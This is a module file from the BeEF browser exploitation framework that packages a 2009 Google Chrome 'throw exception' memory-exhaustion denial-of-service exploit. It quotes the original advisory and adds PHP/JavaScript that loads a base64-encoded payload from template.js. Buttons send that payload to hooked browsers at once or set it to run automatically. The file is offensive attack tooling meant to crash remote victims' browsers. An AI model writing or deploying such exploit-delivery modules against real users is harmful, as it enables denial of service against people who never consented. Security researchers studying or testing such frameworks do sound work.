<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: http://www.milw0rm.com/exploits/8573
BeEF: http://www.secniche.org/gthr.html
BeEF: the following is the boiler plate from the exploit

Advisory: Google Chrome 1.0.154.59 "throw exception" Memory Exhaustion Vulnerability.

Version Affected:
1.0.154.59 . Previous versions are vulnerable too

Description:
The Google chrome browser is vulnerable to memory exhaustion based denial of service which can be triggered remotely.The vulnerability is a result of arbitrary shell code which is rendered in a script tag with an exception that is raised directly with throw statement. It makes the browser to consume memory thereby impacting the focussed window and leads to crash. The impact can be stringent based on different systems.

Proof of Concept:
http://www.secniche.org/gthr

Detection:
SecNiche confirmed this vulnerability affects Google Chrome on Microsoft Windows XP SP2 platform.The versions tested are:1.0.154.59

Disclosure Timeline:
Release Date. April 28 ,2009

Credit:
Aditya K Sood

-->

<script>

	function get_b64_code_cd() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Dos Chrome', get_b64_code_cd());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_cd());
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">DoS Chrome "throw exception" Memory Exhaustion</div>
Google Chrome 1.0.154.53 "throw exception" Remote Crash and Denial of Service <br>
Executing NOP Sled and Shellcode to create an Exception.<br><br>

<div id="module_subsection">
	<form name="myform">
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

